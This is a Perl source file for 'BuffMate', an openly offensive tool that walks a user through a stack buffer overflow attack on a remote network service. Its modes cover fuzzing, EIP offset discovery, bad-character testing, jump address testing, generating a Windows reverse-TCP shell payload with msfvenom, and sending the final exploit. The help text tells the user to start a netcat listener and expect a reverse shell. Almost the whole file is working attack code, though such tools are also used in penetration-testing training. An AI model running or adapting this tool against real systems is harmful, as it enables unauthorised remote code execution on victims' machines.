#!/usr/bin/perl

##############################################################
#  Script     : buffmate.pl
#  Author     : Steve Collmann
#  Email      : stevcoll@gmail.com
#  Created    : 02/09/2020
#  Updated    : 02/09/2020
#  Description: Perl Buffer Overflow Tool
##############################################################

use strict;
use warnings;
use Switch;
use Getopt::Long;
use Encode 'encode';
use IO::Socket::INET;

$| = 1;  ## Disable output buffering

## PASTE MSFVENOM SHELLCODE BELOW
my $shellcode = "";

## All characters to test using debugger
my $hexchars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff";

GetOptions(
  'h|?|help' => sub { help(); },
  'l|local=s' => \my $local,
  'r|remote=s' => \my $remote,
  'm|mode=i' => \my $mode,
  's|string=s' => \my @strings,
  'o|offset=i' => \my $offset,
  'b|bad=s' => \my @badchars,
  'j|jump=s' => \my $jump,
  'i|increment=i' => \(my $increment = 200),
  'v|verbose' => \my $verbose
) or help();

help() unless $mode;
my ($rip,$rport) = validate('host', $remote) unless $mode == 6;
my ($lip,$lport) = validate('host', $local) if $mode == 6;
if ($mode =~ /^(2|3|4|5|7)$/) {
  validate('offset', $offset);
  validate('strings', @strings);
}
validate('jump', $jump) if $mode =~ /^(5|7)$/;
validate('shellcode', $shellcode) if $mode == 7;

switch($mode) {
  ## Fuzzing mode. After attaching debugger, note max bytes printed out on exception.
  case 1 {
    my $buffer;
    while() {
      $buffer .= 'A' x $increment;
      overflow($buffer);
    }
  }

  ## EIP Match Mode. Set offset to max bytes printed out in Fuzzing Mode.
  case 2 {
    my $buffer = `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l $offset`;
    chomp $buffer;
    overflow($buffer);
    print "Enter bytes overwriting EIP: ";
    my $eip = <STDIN>;
    chomp $eip;
    $offset = `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l $offset -q $eip`;
    print $offset . "\n";
  }

  ## EIP Verify Mode. Overwrite EIP with "B" or \x42. Also verify space for shellcode after ESP register - "C" or \x43.
  case 3 {
    my $buffer = 'A' x $offset . "B" x 4 . "C" x 400;
    overflow($buffer);
  }

  ## Char Test Mode. Check for bad characters in buffer using debugger, then remove and rerun this case.
  case 4 {
    foreach my $badchar (@badchars) {
      $hexchars =~ s/$badchar//;
    }
    my $buffer = 'A' x $offset . "B" x 4 . $hexchars;
    overflow($buffer);
  }

  ## Jump Test Mode. Find module without memory protection or bad characters. Set breakpoint in debugger and verify redirection to "shellcode" ("C" section).
  case 5 {
    my $buffer = 'A' x $offset . byteswap($jump) . "C" x 400;
    overflow($buffer);
  }

  ## Generate Shellcode Mode. Set callback address and port. Exclude bad characters. Paste shellcode into top of this script.
  case 6 {
    my ($lip,$lport) = validate('host', $local);
    my $badstring = '\x00';
    $badstring .= $_ for @badchars;
    system("msfvenom -p windows/shell_reverse_tcp LHOST=$lip LPORT=$lport EXITFUNC=thread -f perl –e x86/shikata_ga_nai -v shellcode -b '$badstring'");
  }
  
  ## Execute Exploit Mode. Perform buffer overflow with payload on remote server.
  case 7 {
    my $buffer = 'A' x $offset . byteswap($jump) . "\x90" x 8 . $shellcode;
    overflow($buffer);
  }
}

sub overflow {
  my $buffer = shift;
  my $sock = IO::Socket::INET->new("$rip:$rport") or die "ERROR: Cannot bind to socket!\n";;
  my $data;

  if ($sock->peeraddr()) {
    $sock->recv($data, 1024);
    if (@strings) {
      foreach my $string (@strings) {
        if ($sock->peeraddr()) {
          print "Sending: '" . $string . "' + " . length(encode('UTF-8', $buffer)) . " bytes to socket\n";
          $sock->send($string . $buffer . "\r\n");
          $sock->recv($data, 1024);
          print "  Response: " . length($data) . " bytes\n";
          print "    " . $data if $verbose;
        } else {
          die "ERROR: Socket Failure!\n";
        }
      }
    } else {
      print "Sending " . length(encode('UTF-8', $buffer)) . " bytes to socket\n";
      $sock->send($buffer . "\r\n");
      $sock->recv($data, 1024);
      print "  Response: " . length($data) . " bytes\n";
      print "    " . $data if $verbose;
    }
  } else {
    die "ERROR: Socket Failure!\n";
  }
}

sub validate {
  my ($type,$input) = @_;

  if ($type eq 'host') {   
    my ($address,$switch);
    if ($mode == 6) {
      $address = "Local";
      $switch = "-l";
    } else {
      $address = "Remote";
      $switch = "-r";
    }
    die "ERROR: $address host is required! (e.g. $switch 192.168.1.1:80)\n" unless $input;

    my ($ip,$port) = split(/:/, $input);
    if ($ip && $port) {
      return ($ip,$port);
    } else {
      die "ERROR: Incorrect format for $address host! (e.g. $switch 192.168.1.1:80)\n";
    }
  }

  if ($type eq 'offset') {
    die "ERROR: Byte offset is required in this mode! (e.g. -o 1024)\n" unless $offset;
  }

  if ($type eq 'strings') {
    die "ERROR: Multiple strings only allowed in fuzzing mode!\n" if scalar(@strings) > 1;
  }

  if ($type eq 'jump') {
    die "ERROR: Jump address is required in this mode! (e.g. -j 39D421E6)\n" unless $jump;
  }

  if ($type eq 'shellcode') {
    die "ERROR: Shellcode is required in this mode! (paste at top of tool)\n" unless $shellcode;
  }
}

sub byteswap {
  my $num = shift;
  $num = join '', reverse split /(..)/, $num;
  $num = pack "H*", $num;
  return $num;
}

sub help {
print 'BuffMate - Perl Buffer Overflow Tool | Steve Collmann - stevcoll@gmail.com

Options:
   -m, --mode            Program mode. See "Modes" below for details.
   -l, --local           Local client address and port (IPv4), colon delimited.
   -r, --remote          Remote server address and port (IPv4), colon delimited.
   -s, --string          String to send before buffer. Multiple strings supported. Optional.
   -o, --offset          Loose offset from fuzzing or exact offset from EIP byte match.
   -b, --bad             Bad character to exclude in payload. Multiple parameters supported.
   -j, --jump            Memory jump return address. Automatically converted to little endian.
   -i, --increment       Step increment for fuzzer. Default: 200 bytes.
   -v, --verbose         Show remote server responses to socket sends.

Examples:
   ./buffmate.pl -m 1 -r 10.0.0.1:80 -s "PWD "                     ## Fuzz remote server
   ./buffmate.pl -m 2 -r 10.0.0.1:80 -s "PWD " -o 140              ## Locate EIP offset
   ./buffmate.pl -m 3 -r 10.0.0.1:80 -s "PWD " -o 136              ## Verify EIP offset
   ./buffmate.pl -m 4 -r 10.0.0.1:80 -s "PWD " -o 136 -b \x15      ## Test and remove bad chars
   ./buffmate.pl -m 5 -r 10.0.0.1:80 -s "PWD " -o 136 -j 39D421E6  ## Test jump address
   ./buffmate.pl -m 6 -l 192.168.1.1:443 -b \x15 -b \x35           ## Generate shellcode
   ./buffmate.pl -m 7 -r 10.0.0.1:80 -s "PWD " -o 136 -j 39D421E6  ## Exploit server

Modes:
   * [1] Fuzzing  
     - Buffer can be sent with or without prepended strings (e.g. "AUTH ").
     - Multiple prepended strings can be sent (e.g. -s "USER " -s "PASS ").
     - Identify buffer size in bytes which causes an exception on service.
   * [2] EIP Match
     - Attach debugger to service and run tool with offset found in fuzzing mode.
     - Ensure prepended string option is used for all stages if required.
     - After service exception debugger should display unique EIP address.
     - Enter unique EIP address into tool and identify exact EIP offset.
   * [3] EIP Verify
     - Attach debugger to service and run tool with exact offset found in EIP match.
     - Verify EIP is overwritten with "B" or "\x42" characters.
     - Verify space for shellcode in "C" or "\x43" characters. (i.e. ~400 bytes).
   * [4] Char Test
     - Attach debugger to service and run tool with discovered offset.
     - Check debugger for evidence of bad characters corrupting the buffer.
     - Remove any bad characters with tool and rerun char test as appropriate.
   * [5] Jump Test
     - Utilize debugger to locate module with no memory protections.
     - Locate appropriate memory address to jump to in discovered module.
     - Ensure memory address contains no bad characters.
     - Attach debugger to service and set breakpoint at jump memory address.
     - Run tool with new jump address and bad char options.
     - Ensure debugger stops at breakpoint and execution redirects to "C" or "\x43".
   * [6] Generate Shellcode
     - Run tool with local (attacking) host and bad char options to generate shellcode.
     - Copy and paste enter $shellcode variable output into top of tool code.
   * [7] Exploit Server
     - Start service on local host with appropriate options (e.g. nc -vlnp 443).
     - Run tool with remote host, offset, jump address, and bad char options.
     - Reverse shell should appear on local host.
 ';
  exit;
}
